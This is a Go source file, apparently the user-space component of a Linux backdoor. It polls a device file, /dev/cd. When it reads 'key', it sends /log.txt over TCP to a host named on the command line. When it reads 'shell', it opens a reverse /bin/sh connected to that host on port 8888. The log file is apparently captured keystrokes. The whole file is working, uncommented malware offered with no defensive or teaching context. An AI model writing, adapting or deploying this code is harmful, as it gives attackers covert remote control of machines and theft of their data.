package main

import (
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"
	"syscall"
	"time"
)

const BUFFERSIZE = 1024
const PORT = "8888"
const LOGFILE = "/log.txt"

func fillString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}

func sendLog(wg *sync.WaitGroup) {
	defer wg.Done()
	connection, err := net.Dial("tcp", os.Args[1]+":"+PORT)
	if err != nil {
		return
	}
	defer connection.Close()
	file, err := os.Open(LOGFILE)
	if err != nil {
		return
	}
	fileInfo, err := file.Stat()
	if err != nil {
		return
	}
	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	connection.Write([]byte(fileSize))
	sendBuffer := make([]byte, BUFFERSIZE)
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		connection.Write(sendBuffer)
	}
	return
}

func sendShell(wg *sync.WaitGroup) {
	defer wg.Done()
	c, _ := net.Dial("tcp", os.Args[1]+":"+PORT)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

func main() {
	data := make([]byte, 10)
	var wg sync.WaitGroup
	for {
		f, err := syscall.Open("/dev/cd", syscall.O_RDONLY, 0666)
		if err != nil {
			continue
		}
		_, err = syscall.Read(f, data)
		if err != nil {
			continue
		}
		if "key" == string(data[:3]) {
			wg.Add(1)
			go sendLog(&wg)
		} else if "shell" == string(data[:5]) {
			wg.Add(1)
			go sendShell(&wg)
		}

		err = syscall.Close(f)
		time.Sleep(2 * time.Second)
	}
}
